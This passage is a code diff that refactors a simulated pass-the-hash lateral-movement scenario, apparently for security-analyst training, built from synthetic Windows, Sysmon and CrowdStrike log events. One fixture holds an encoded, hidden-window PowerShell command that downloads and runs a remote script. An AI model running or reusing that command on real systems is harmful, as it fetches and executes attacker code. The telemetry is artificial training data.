@@ -30,6 +30,10 @@
 
 import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
 import { makeSha256 } from "@/lib/sim/iocs";
+import { winLogon, winSpecialPrivileges, winShareAccess, winServiceInstall, winProcessCreate } from "@/lib/sim/emitters/windowsSecurity";
+import { sysmonProcess, sysmonNetwork, sysmonProcessAccess } from "@/lib/sim/emitters/sysmon";
+import { csAlert } from "@/lib/sim/emitters/crowdstrike";
+import { sentinelUeba } from "@/lib/sim/emitters/sentinel";
 
 export function buildLateralMovementPthScenario(
   scenarioId = "lateral-movement-pth-2026",
@@ -64,575 +68,145 @@ export function buildLateralMovementPthScenario(
   const svcBinaryHash = makeSha256("lateralmovement_pth_svcupd64_service_binary_2026");
   const sensorId = "b83f2c1e7d9a4056b1d4e8720af3c915";
 
+  const cxNexa = "nexacorp" as const;
+
   const events: TelemetryEvent[] = [
-    // ─────────────────────────────────────────────────────────────────────
-    // 0. BENIGN CONTROL — the legitimate way to reach SRV-FILE-03.
-    //    A prior-day 4624: same event ID, same LogonType 3, but Kerberos,
-    //    from the user's own workstation, in business hours. This is what a
-    //    normal network logon to the file server looks like.
-    // ─────────────────────────────────────────────────────────────────────
+    // 0. BENIGN CONTROL — the legitimate way to reach SRV-FILE-03 (Kerberos, own WS, business hours).
     {
-      id: "evt_lm_00_benign_logon",
-      ts: "2026-08-26T13:12:04.000Z",
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "auth_success",
-      hostname: fileSrv.hostname,
-      user_email: benign.email,
-      src_ip: benignWs.ip,
-      severity: "informational",
+      ...winLogon({
+        companyId: cxNexa, id: "evt_lm_00_benign_logon", ts: "2026-08-26T13:12:04.000Z", host: fileSrv.hostname, fqdn: fileSrv.fqdn,
+        targetUser: benign.sam, targetSid: benignSid, srcIp: benignWs.ip, logonType: 3, authPackage: "Kerberos", logonProcess: "Kerberos",
+        logonId: "0x5A11C02", srcPort: "50142", workstation: benignWs.hostname, recordId: "5540912", severity: "informational",
+        description:
+          "A 4624 network logon for m.rossi on SRV-FILE-03 at 13:12 the previous afternoon, LogonType 3 over Kerberos, from her own workstation FIN-WS-22.",
+      }),
       fp_explanation:
         "Legitimate Type-3 network logon to the file server: Kerberos (the in-domain default), from the user's OWN workstation FIN-WS-22, at 13:12 on a business day. Same 4624 / LogonType 3 as the attack — the difference is the authentication package, the source host, and the hour.",
-      description:
-        "A 4624 network logon for m.rossi on SRV-FILE-03 at 13:12 the previous afternoon, LogonType 3 over Kerberos, from her own workstation FIN-WS-22.",
-      authentication: { method: "Kerberos", result: "success", logon_type: 3 },
-      raw: {
-        "winlog.event_id": "4624",
-        "winlog.channel": "Security",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.record_id": "5540912",
-        "winlog.event_data.SubjectUserSid": "S-1-0-0",
-        "winlog.event_data.SubjectUserName": "-",
-        "winlog.event_data.SubjectDomainName": "-",
-        "winlog.event_data.SubjectLogonId": "0x0",
-        "winlog.event_data.TargetUserSid": benignSid,
-        "winlog.event_data.TargetUserName": benign.sam,
-        "winlog.event_data.TargetDomainName": "NEXACORP",
-        "winlog.event_data.TargetLogonId": "0x5A11C02",
-        "winlog.event_data.LogonType": "3",
-        "winlog.event_data.LogonProcessName": "Kerberos",
-        "winlog.event_data.AuthenticationPackageName": "Kerberos",
-        "winlog.event_data.WorkstationName": benignWs.hostname,
-        "winlog.event_data.IpAddress": benignWs.ip,
-        "winlog.event_data.IpPort": "50142",
-        "winlog.event_data.ImpersonationLevel": "%%1833",
-        "winlog.event_data.ElevatedToken": "%%1842",
-        "event.code": "4624",
-        "event.action": "logged-in",
-        "event.outcome": "success",
-        "source.ip": benignWs.ip,
-        "user.name": benign.sam,
-        "user.domain": "NEXACORP",
-      },
     },
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 1. THE SOURCE OF THE HASH — LSASS access on the foothold FIN-WS-11.
-    //    Sysmon Event 10: a masquerading process opens lsass.exe with the
-    //    access rights a credential dumper needs (0x1410). This is where the
-    //    NTLM hash the operator is about to replay came from (T1003.001).
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_01_lsass_access",
-      ts: T(0),
-      source: "sysmon",
-      vendor: "Microsoft Sysmon",
-      event_type: "process_access",
-      hostname: foothold.hostname,
-      src_ip: foothold.ip,
-      severity: "high",
-      mitre_technique: "T1003.001",
-      mitre_tactic: "Credential Access",
-      incident_id: INCIDENT,
+    // 1. THE SOURCE OF THE HASH — LSASS access on the foothold (Sysmon 10).
+    sysmonProcessAccess({
+      companyId: cxNexa, id: "evt_lm_01_lsass_access", ts: T(0), host: foothold.hostname, user: admin.email, srcIp: foothold.ip,
+      sourceImage: "C:\\Windows\\Temp\\svchost.exe", sourcePid: 6624, targetPid: 712, grantedAccess: "0x1410",
+      callTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+2a1ee|UNKNOWN(0000000abc120000)",
+      mitre: "T1003.001", tactic: "Credential Access", severity: "high", incidentId: INCIDENT,
       description:
         "On the foothold host FIN-WS-11 a process running from C:\\Windows\\Temp opened lsass.exe with GrantedAccess 0x1410 at 02:00 — the read/query rights a credential dumper uses to lift hashes from memory.",
-      process: {
-        name: "svchost.exe",
-        pid: 6624,
-        path: "C:\\Windows\\Temp\\svchost.exe",
-        cmdline: "C:\\Windows\\Temp\\svchost.exe",
-        user: `NEXACORP\\${admin.sam}`,
-      },
-      raw: {
-        // Sysmon Event 10 — ProcessAccess
-        "winlog.event_id": "10",
-        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
-        "winlog.provider_name": "Microsoft-Windows-Sysmon",
-        "winlog.computer_name": foothold.fqdn,
-        "winlog.event_data.SourceImage": "C:\\Windows\\Temp\\svchost.exe",
-        "winlog.event_data.SourceProcessId": "6624",
-        "winlog.event_data.TargetImage": "C:\\Windows\\System32\\lsass.exe",
-        "winlog.event_data.TargetProcessId": "712",
-        "winlog.event_data.GrantedAccess": "0x1410",
-        "winlog.event_data.CallTrace":
-          "C:\\Windows\\SYSTEM32\\ntdll.dll+9d234|C:\\Windows\\System32\\KERNELBASE.dll+2a1ee|UNKNOWN(0000000abc120000)",
-        "winlog.event_data.User": `NEXACORP\\${admin.sam}`,
-        "host.name": foothold.hostname,
-        "host.ip": foothold.ip,
-        "event.code": "10",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 2. THE PASS-THE-HASH LANDING — a 4624 on SRV-FILE-03 that looks ordinary.
-    //    Type 3, NTLM, from FIN-WS-11's IP and workstation name, off-hours.
-    //    No password was ever typed; the hash alone authenticated (T1550.002).
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_02_pth_logon",
-      ts: T(4 * MIN),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "auth_success",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: foothold.ip,
-      severity: "high",
-      mitre_technique: "T1550.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INCIDENT,
+    // 2. THE PASS-THE-HASH LANDING — an ordinary-looking 4624, but NTLM, off-hours.
+    winLogon({
+      companyId: cxNexa, id: "evt_lm_02_pth_logon", ts: T(4 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
+      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
+      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x6C41F70", srcPort: "49277", workstation: foothold.hostname, recordId: "5551338",
+      mitre: "T1550.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
       description:
         "A 4624 network logon for s.kessler arrived on SRV-FILE-03 at 02:04, LogonType 3 over NTLM, from FIN-WS-11 (10.20.6.41) — a finance workstation reaching a file server as an infrastructure admin, at night.",
-      authentication: { method: "NTLM", result: "success", logon_type: 3 },
-      raw: {
-        "winlog.event_id": "4624",
-        "winlog.channel": "Security",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.record_id": "5551338",
-        "winlog.event_data.SubjectUserSid": "S-1-0-0",
-        "winlog.event_data.SubjectUserName": "-",
-        "winlog.event_data.SubjectDomainName": "-",
-        "winlog.event_data.SubjectLogonId": "0x0",
-        "winlog.event_data.TargetUserSid": adminSid,
-        "winlog.event_data.TargetUserName": admin.sam,
-        "winlog.event_data.TargetDomainName": "NEXACORP",
-        "winlog.event_data.TargetLogonId": "0x6C41F70",
-        "winlog.event_data.LogonType": "3",
-        "winlog.event_data.LogonProcessName": "NtLmSsp ",
-        "winlog.event_data.AuthenticationPackageName": "NTLM",
-        "winlog.event_data.LmPackageName": "NTLM V2",
-        "winlog.event_data.KeyLength": "0",
-        "winlog.event_data.WorkstationName": foothold.hostname,
-        "winlog.event_data.LogonGuid": "{00000000-0000-0000-0000-000000000000}",
-        "winlog.event_data.IpAddress": foothold.ip,
-        "winlog.event_data.IpPort": "49277",
-        "winlog.event_data.ImpersonationLevel": "%%1833",
-        "winlog.event_data.ElevatedToken": "%%1842",
-        "event.code": "4624",
-        "event.action": "logged-in",
-        "event.outcome": "success",
-        "source.ip": foothold.ip,
-        "user.name": admin.sam,
-        "user.domain": "NEXACORP",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 3. 4672 — the logon carried admin privileges. Confirms the replayed
-    //    hash belongs to a highly-privileged account, not an ordinary user.
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_03_special_privs",
-      ts: T(4 * MIN + 6 * SEC),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "privilege_escalation",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: foothold.ip,
-      severity: "medium",
-      mitre_technique: "T1078",
-      mitre_tactic: "Privilege Escalation",
-      incident_id: INCIDENT,
+    // 3. 4672 — the logon carried admin privileges.
+    winSpecialPrivileges({
+      companyId: cxNexa, id: "evt_lm_03_special_privs", ts: T(4 * MIN + 6 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
+      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, logonId: "0x6C41F70", recordId: "5551339",
+      privilegeList: "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeTcbPrivilege",
+      mitre: "T1078", tactic: "Privilege Escalation", severity: "medium", incidentId: INCIDENT,
       description:
         "A 4672 on SRV-FILE-03 assigned SeDebugPrivilege, SeTcbPrivilege and SeBackupPrivilege to the s.kessler logon session — this NTLM network logon is running with local-administrator rights.",
-      raw: {
-        // Windows Security Event 4672 — Special privileges assigned to new logon
-        "winlog.event_id": "4672",
-        "winlog.channel": "Security",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.record_id": "5551339",
-        "winlog.event_data.SubjectUserSid": adminSid,
-        "winlog.event_data.SubjectUserName": admin.sam,
-        "winlog.event_data.SubjectDomainName": "NEXACORP",
-        "winlog.event_data.SubjectLogonId": "0x6C41F70",
-        "winlog.event_data.PrivilegeList":
-          "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeTcbPrivilege",
-        "event.code": "4672",
-        "event.action": "logged-in-special",
-        "event.outcome": "success",
-        "user.name": admin.sam,
-        "user.domain": "NEXACORP",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 4. 5140 — the ADMIN$ administrative share is opened. This is the SMB
-    //    channel PsExec-style remote execution rides on (T1021.002).
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_04_admin_share",
-      ts: T(4 * MIN + 22 * SEC),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "file_access",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: foothold.ip,
-      severity: "high",
-      mitre_technique: "T1021.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INCIDENT,
+    // 4. 5140 — ADMIN$ opened (the PsExec SMB channel).
+    winShareAccess({
+      companyId: cxNexa, id: "evt_lm_04_admin_share", ts: T(4 * MIN + 22 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
+      targetUser: admin.sam, targetSid: adminSid, srcIp: foothold.ip, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows",
+      subjectLogonId: "0x6C41F70", recordId: "5551361", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
       description:
         "SRV-FILE-03 logged a 5140 connection to the ADMIN$ administrative share under the s.kessler session from 10.20.6.41 — the hidden share used to stage and launch remote code, not a normal file access.",
-      raw: {
-        // Windows Security Event 5140 — A network share object was accessed
-        "winlog.event_id": "5140",
-        "winlog.channel": "Security",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.record_id": "5551361",
-        "winlog.event_data.SubjectUserSid": adminSid,
-        "winlog.event_data.SubjectUserName": admin.sam,
-        "winlog.event_data.SubjectDomainName": "NEXACORP",
-        "winlog.event_data.SubjectLogonId": "0x6C41F70",
-        "winlog.event_data.ObjectType": "File",
-        "winlog.event_data.IpAddress": foothold.ip,
-        "winlog.event_data.IpPort": "49277",
-        "winlog.event_data.ShareName": "\\\\*\\ADMIN$",
-        "winlog.event_data.ShareLocalPath": "\\??\\C:\\Windows",
-        "winlog.event_data.AccessMask": "0x1",
-        "winlog.event_data.AccessList": "%%4416",
-        "event.code": "5140",
-        "event.action": "share-accessed",
-        "event.outcome": "success",
-        "source.ip": foothold.ip,
-        "user.name": admin.sam,
-        "user.domain": "NEXACORP",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 5. 7045 — a service is installed remotely on SRV-FILE-03. Auto-start,
-    //    binary dropped into C:\Windows, running as LocalSystem. This is the
-    //    PsExec / remote-service-creation pattern (T1569.002).
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_05_service_install",
-      ts: T(5 * MIN),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "service_install",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: foothold.ip,
-      severity: "high",
-      mitre_technique: "T1569.002",
-      mitre_tactic: "Execution",
-      incident_id: INCIDENT,
+    // 5. 7045 — a service is installed remotely.
+    winServiceInstall({
+      companyId: cxNexa, id: "evt_lm_05_service_install", ts: T(5 * MIN), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
+      targetUser: admin.sam, srcIp: foothold.ip, serviceName: "WinSvcUpdate", imagePath: "C:\\Windows\\svcupd64.exe",
+      accountName: "LocalSystem", serviceType: "user mode service", startType: "auto start", recordId: "884012",
+      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
       description:
         "A 7045 on SRV-FILE-03 recorded a new auto-start service, WinSvcUpdate, whose binary C:\\Windows\\svcupd64.exe runs as LocalSystem — a service created over the ADMIN$ session moments after the NTLM logon.",
-      raw: {
-        // Windows Security / System Event 7045 — A new service was installed
-        "winlog.event_id": "7045",
-        "winlog.channel": "System",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.provider_name": "Service Control Manager",
-        "winlog.record_id": "884012",
-        "winlog.event_data.AccountName": "LocalSystem",
-        "winlog.event_data.ServiceName": "WinSvcUpdate",
-        "winlog.event_data.ImagePath": "C:\\Windows\\svcupd64.exe",
-        "winlog.event_data.ServiceType": "user mode service",
-        "winlog.event_data.StartType": "auto start",
-        "event.code": "7045",
-        "event.action": "service-installed",
-        "event.outcome": "success",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 6. Sysmon Event 1 — the service binary executes: services.exe (the SCM)
-    //    spawns C:\Windows\svcupd64.exe. Unsigned, from an unusual location.
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_06_service_exec",
-      ts: T(5 * MIN + 9 * SEC),
-      source: "sysmon",
-      vendor: "Microsoft Sysmon",
-      event_type: "process_create",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: fileSrv.ip,
-      severity: "high",
-      mitre_technique: "T1569.002",
-      mitre_tactic: "Execution",
-      incident_id: INCIDENT,
+    // 6. Sysmon 1 — the service binary executes as SYSTEM.
+    sysmonProcess({
+      companyId: cxNexa, id: "evt_lm_06_service_exec", ts: T(5 * MIN + 9 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
+      processName: "svcupd64.exe", processPath: "C:\\Windows\\svcupd64.exe", cmdline: "C:\\Windows\\svcupd64.exe",
+      parentName: "services.exe", parentPath: "C:\\Windows\\System32\\services.exe", pid: 8104, parentPid: 720,
+      sha256: svcBinaryHash, signed: false, integrity: "System", originalFileName: "svcupd64.exe", runAsUser: "NT AUTHORITY\\SYSTEM",
+      mitre: "T1569.002", tactic: "Execution", severity: "high", incidentId: INCIDENT,
       description:
         "Sysmon recorded services.exe on SRV-FILE-03 spawning C:\\Windows\\svcupd64.exe as LocalSystem — the installed service starting, an unsigned binary launched by the Service Control Manager.",
-      process: {
-        name: "svcupd64.exe",
-        pid: 8104,
-        path: "C:\\Windows\\svcupd64.exe",
-        parent_name: "services.exe",
-        parent_pid: 720,
-        cmdline: "C:\\Windows\\svcupd64.exe",
-        user: "NT AUTHORITY\\SYSTEM",
-        integrity: "system",
-        hash: { sha256: svcBinaryHash },
-      },
-      raw: {
-        // Sysmon Event 1 — ProcessCreate
-        "winlog.event_id": "1",
-        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
-        "winlog.provider_name": "Microsoft-Windows-Sysmon",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.event_data.Image": "C:\\Windows\\svcupd64.exe",
-        "winlog.event_data.OriginalFileName": "svcupd64.exe",
-        "winlog.event_data.CommandLine": "C:\\Windows\\svcupd64.exe",
-        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\services.exe",
-        "winlog.event_data.ParentProcessId": "720",
-        "winlog.event_data.ProcessId": "8104",
-        "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
-        "winlog.event_data.IntegrityLevel": "System",
-        "winlog.event_data.Hashes": `SHA256=${svcBinaryHash}`,
-        "winlog.event_data.Signed": "false",
-        "host.name": fileSrv.hostname,
-        "host.ip": fileSrv.ip,
-        "process.name": "svcupd64.exe",
-        "process.hash.sha256": svcBinaryHash,
-        "event.code": "1",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 7. 4688 — the payload spawns an encoded PowerShell child. Windows
-    //    Security process creation, showing the service binary is a launcher.
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_07_payload_powershell",
-      ts: T(5 * MIN + 12 * SEC),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "process_create",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: fileSrv.ip,
-      severity: "high",
-      mitre_technique: "T1059.001",
-      mitre_tactic: "Execution",
-      incident_id: INCIDENT,
+    // 7. 4688 — the payload spawns an encoded PowerShell child.
+    winProcessCreate({
+      companyId: cxNexa, id: "evt_lm_07_payload_powershell", ts: T(5 * MIN + 12 * SEC), host: fileSrv.hostname, fqdn: fileSrv.fqdn,
+      targetUser: admin.sam, srcIp: fileSrv.ip, processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      cmdline: "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB3AGkAbgB1AHAAZABhAHQAZQAuAG4AZQB0AC8AYwAuAHAAcwAxACcAKQA=", parentPath: "C:\\Windows\\svcupd64.exe", pid: 8260, subjectUser: "SRV-FILE-03$", subjectSid: "S-1-5-18",
+      runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", tokenElevation: "%%1936", recordId: "5551402",
+      mitre: "T1059.001", tactic: "Execution", severity: "high", incidentId: INCIDENT,
       description:
         "A 4688 on SRV-FILE-03 shows svcupd64.exe spawning an encoded, hidden-window PowerShell as SYSTEM — the remotely-installed service acting as a loader.",
-      process: {
-        name: "powershell.exe",
-        pid: 8260,
-        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        parent_name: "svcupd64.exe",
-        parent_pid: 8104,
-        cmdline: "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB3AGkAbgB1AHAAZABhAHQAZQAuAG4AZQB0AC8AYwAuAHAAcwAxACcAKQA=",
-        user: "NT AUTHORITY\\SYSTEM",
-        integrity: "system",
-      },
-      raw: {
-        // Windows Security Event 4688 — A new process has been created
-        "winlog.event_id": "4688",
-        "winlog.channel": "Security",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.record_id": "5551402",
-        "winlog.event_data.SubjectUserSid": "S-1-5-18",
-        "winlog.event_data.SubjectUserName": "SRV-FILE-03$",
-        "winlog.event_data.SubjectDomainName": "NEXACORP",
-        "winlog.event_data.SubjectLogonId": "0x3E7",
-        "winlog.event_data.NewProcessId": "0x2044",
-        "winlog.event_data.NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "winlog.event_data.CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB3AGkAbgB1AHAAZABhAHQAZQAuAG4AZQB0AC8AYwAuAHAAcwAxACcAKQA=",
-        "winlog.event_data.ParentProcessName": "C:\\Windows\\svcupd64.exe",
-        "winlog.event_data.TokenElevationType": "%%1936",
-        "winlog.event_data.MandatoryLabel": "S-1-16-16384",
-        "event.code": "4688",
-        "event.action": "created-process",
-        "event.outcome": "success",
-        "user.name": "SRV-FILE-03$",
-        "user.domain": "NEXACORP",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 8. Sysmon Event 3 — the payload reaches toward the DC over SMB (445).
-    //    The second hop being set up: SRV-FILE-03 → DC-NEXA-01.
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_08_smb_to_dc",
-      ts: T(6 * MIN),
-      source: "sysmon",
-      vendor: "Microsoft Sysmon",
-      event_type: "net_connection",
-      hostname: fileSrv.hostname,
-      src_ip: fileSrv.ip,
-      dst_ip: dc.ip,
-      dst_port: 445,
-      protocol: "tcp",
-      severity: "high",
-      mitre_technique: "T1021.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INCIDENT,
+    // 8. Sysmon 3 — the payload reaches toward the DC over SMB (445).
+    sysmonNetwork({
+      companyId: cxNexa, id: "evt_lm_08_smb_to_dc", ts: T(6 * MIN), host: fileSrv.hostname, user: null, srcIp: fileSrv.ip,
+      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid: 8260, remoteIp: dc.ip, remotePort: 445, remoteHost: dc.fqdn,
+      transport: "tcp", mitre: "T1021.002", tactic: "Lateral Movement", severity: "high", incidentId: INCIDENT,
       description:
         "Sysmon recorded powershell.exe on SRV-FILE-03 opening an outbound TCP/445 (SMB) connection to DC-NEXA-01 (10.20.5.10) — the operator pivoting from the file server toward a Domain Controller.",
-      raw: {
-        // Sysmon Event 3 — NetworkConnect
-        "winlog.event_id": "3",
-        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
-        "winlog.provider_name": "Microsoft-Windows-Sysmon",
-        "winlog.computer_name": fileSrv.fqdn,
-        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "winlog.event_data.ProcessId": "8260",
-        "winlog.event_data.Protocol": "tcp",
-        "winlog.event_data.Initiated": "true",
-        "winlog.event_data.SourceIp": fileSrv.ip,
-        "winlog.event_data.SourceHostname": fileSrv.fqdn,
-        "winlog.event_data.SourcePort": "51993",
-        "winlog.event_data.DestinationIp": dc.ip,
-        "winlog.event_data.DestinationHostname": dc.fqdn,
-        "winlog.event_data.DestinationPort": "445",
-        "winlog.event_data.DestinationPortName": "microsoft-ds",
-        "host.name": fileSrv.hostname,
-        "host.ip": fileSrv.ip,
-        "destination.ip": dc.ip,
-        "destination.port": "445",
-        "event.code": "3",
-      },
+    }),
+
+    // 9. CrowdStrike Falcon detection — the pass-the-hash pattern (edr_scope hybrid).
+    {
+      ...csAlert({
+        companyId: cxNexa, id: "evt_lm_09_edr_detection", ts: T(6 * MIN + 40 * SEC), host: fileSrv.hostname, user: admin.email, srcIp: fileSrv.ip,
+        threatName: "PassTheHashRemoteServiceExecution", mitre: "T1550.002", tactic: "Lateral Movement",
+        technique: "Use Alternate Authentication Material: Pass the Hash", processTree: "services.exe > svcupd64.exe > powershell.exe",
+        severity: "critical", action: "detected", incidentId: INCIDENT,
+        description:
+          "Falcon raised a Critical detection on SRV-FILE-03: an NTLM network logon for a privileged account from a workstation, followed by a remotely-installed service and an encoded PowerShell reaching a Domain Controller — a pass-the-hash lateral-movement pattern.",
+      }),
+      edr_scope: "hybrid",
     },
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 9. CrowdStrike Falcon detection on SRV-FILE-03 — alert-grade. Ties the
-    //    NTLM network logon, the remote service, and the DC-bound SMB into one
-    //    pass-the-hash detection. is_detection + edr_scope "hybrid".
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_09_edr_detection",
-      ts: T(6 * MIN + 40 * SEC),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "edr_alert",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: fileSrv.ip,
-      severity: "critical",
-      mitre_technique: "T1550.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INCIDENT,
-      is_detection: true,   // the Falcon detection that opened the incident
-      edr_scope: "hybrid",  // host artifacts (remote service, PS loader) + the AD NTLM logon that delivered the operator — pivot to EDR for SRV-FILE-03
-      description:
-        "Falcon raised a Critical detection on SRV-FILE-03: an NTLM network logon for a privileged account from a workstation, followed by a remotely-installed service and an encoded PowerShell reaching a Domain Controller — a pass-the-hash lateral-movement pattern.",
-      raw: {
-        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.name": "PassTheHashRemoteServiceExecution",
-        "crowdstrike.detection.tactic": "Lateral Movement",
-        "crowdstrike.detection.technique": "Use Alternate Authentication Material: Pass the Hash",
-        "crowdstrike.detection.technique_id": "T1550.002",
-        "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.detection.process_tree": "services.exe > svcupd64.exe > powershell.exe",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.network_containment_state": "Not Contained",
-        "crowdstrike.sensor.id": sensorId,
-        "host.name": fileSrv.hostname,
-        "host.ip": fileSrv.ip,
-        "user.name": `NEXACORP\\${admin.sam}`,
-      },
-    },
-
-    // ─────────────────────────────────────────────────────────────────────
-    // 10. THE SECOND HOP — a 4624 on the DC, same account, same hash, now
-    //     from SRV-FILE-03. NTLM Type-3 again (T1550.002 / T1021.002).
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_10_dc_logon",
-      ts: T(8 * MIN),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "auth_success",
-      hostname: dc.hostname,
-      user_email: admin.email,
-      src_ip: fileSrv.ip,
-      severity: "critical",
-      mitre_technique: "T1550.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INCIDENT,
+    // 10. THE SECOND HOP — a 4624 on the DC, same hash, from SRV-FILE-03.
+    winLogon({
+      companyId: cxNexa, id: "evt_lm_10_dc_logon", ts: T(8 * MIN), host: dc.hostname, fqdn: dc.fqdn,
+      targetUser: admin.sam, targetSid: adminSid, srcIp: fileSrv.ip, logonType: 3, authPackage: "NTLM", logonProcess: "NtLmSsp ",
+      lmPackage: "NTLM V2", keyLength: "0", logonId: "0x8B03D19", srcPort: "52140", workstation: fileSrv.hostname, recordId: "9920551",
+      mitre: "T1550.002", tactic: "Lateral Movement", severity: "critical", incidentId: INCIDENT,
       description:
         "A 4624 network logon for s.kessler landed on DC-NEXA-01 at 02:08, LogonType 3 over NTLM, this time sourced from SRV-FILE-03 (10.20.7.28) — the same replayed hash reaching a Domain Controller one hop on.",
-      authentication: { method: "NTLM", result: "success", logon_type: 3 },
-      raw: {
-        "winlog.event_id": "4624",
-        "winlog.channel": "Security",
-        "winlog.computer_name": dc.fqdn,
